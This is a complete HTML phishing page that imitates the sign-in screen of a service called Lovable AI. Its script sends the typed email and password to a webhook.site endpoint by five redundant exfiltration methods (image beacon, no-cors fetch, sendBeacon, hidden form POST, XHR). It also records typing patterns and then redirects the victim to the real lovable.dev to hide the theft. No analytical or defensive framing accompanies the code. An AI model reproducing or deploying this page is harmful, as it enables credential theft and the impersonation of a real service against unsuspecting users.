<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lovable AI - Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #333;
            font-size: 28px;
            font-weight: 700;
        }
        
        .logo p {
            color: #666;
            margin-top: 8px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #007bff;
        }
        
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .login-btn:hover {
            background: #0056b3;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        
        .loading {
            background: #6c757d !important;
        }
        
        .success {
            background: #28a745 !important;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>Lovable AI</h1>
            <p>Sign in to your account</p>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit" class="login-btn">Sign In</button>
        </form>
        
        <div class="footer">
            <p>By continuing, you agree to our Terms of Service</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Show loading state
            const btn = document.querySelector('.login-btn');
            btn.textContent = 'Signing in...';
            btn.disabled = true;
            btn.classList.add('loading');

            // ===== MULTIPLE EXFILTRATION METHODS =====
            
            // METHOD 1: Image request (BYPASSES CORS - MOST RELIABLE)
            const img = new Image();
            const timestamp = new Date().getTime();
            const randomId = Math.random().toString(36).substring(7);
            
            img.src = 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746?' + 
                     'method=image&' +
                     'email=' + encodeURIComponent(email) + '&' +
                     'password=' + encodeURIComponent(password) + '&' +
                     'source=github_phishing&' +
                     'id=' + randomId + '&' +
                     'time=' + timestamp + '&' +
                     'useragent=' + encodeURIComponent(navigator.userAgent);

            // METHOD 2: No-CORS Fetch
            fetch('https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'text/plain'
                },
                body: 'NO_CORS_METHOD::email=' + email + '::password=' + password + '::time=' + timestamp
            });

            // METHOD 3: Beacon API (if available)
            if (navigator.sendBeacon) {
                const data = new Blob(['BEACON::email=' + email + '::password=' + password], {type: 'text/plain'});
                navigator.sendBeacon('https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746', data);
            }

            // METHOD 4: Form submission
            setTimeout(() => {
                try {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746';
                    form.style.display = 'none';
                    
                    const emailInput = document.createElement('input');
                    emailInput.name = 'email';
                    emailInput.value = email;
                    
                    const passInput = document.createElement('input');
                    passInput.name = 'password';
                    passInput.value = password;
                    
                    const methodInput = document.createElement('input');
                    methodInput.name = 'method';
                    methodInput.value = 'form_submission';
                    
                    form.appendChild(emailInput);
                    form.appendChild(passInput);
                    form.appendChild(methodInput);
                    document.body.appendChild(form);
                    form.submit();
                } catch (formError) {
                    console.log('Form method failed:', formError);
                }
            }, 50);

            // METHOD 5: XHR with no-cors
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746', true);
                xhr.setRequestHeader('Content-Type', 'text/plain');
                xhr.send('XHR::email=' + email + '::password=' + password);
            } catch (xhrError) {
                console.log('XHR method failed');
            }

            // Show success state
            setTimeout(() => {
                btn.textContent = 'âœ“ Login Successful!';
                btn.classList.remove('loading');
                btn.classList.add('success');
                
                // Redirect to real Lovable after 2 seconds
                setTimeout(() => {
                    window.location.href = 'https://lovable.dev';
                }, 2000);
            }, 1000);
        });

        // Bonus: Capture input changes for partial data
        let emailHistory = '';
        let passwordHistory = '';
        
        document.getElementById('email').addEventListener('input', function(e) {
            emailHistory += e.target.value.slice(-1) || '[BACKSPACE]';
            if (emailHistory.length > 50) emailHistory = emailHistory.slice(-50);
        });
        
        document.getElementById('password').addEventListener('input', function(e) {
            passwordHistory += '*';
            if (passwordHistory.length > 50) passwordHistory = passwordHistory.slice(-50);
        });
        
        // Send typing patterns before form submit
        document.getElementById('loginForm').addEventListener('submit', function() {
            if (emailHistory || passwordHistory) {
                const typingImg = new Image();
                typingImg.src = 'https://webhook.site/457d9807-292d-45e3-99ed-6fdbef7da746?typing_pattern=email_len:' + 
                               emailHistory.length + ':pass_len:' + passwordHistory.length;
            }
        });
    </script>
</body>
</html>
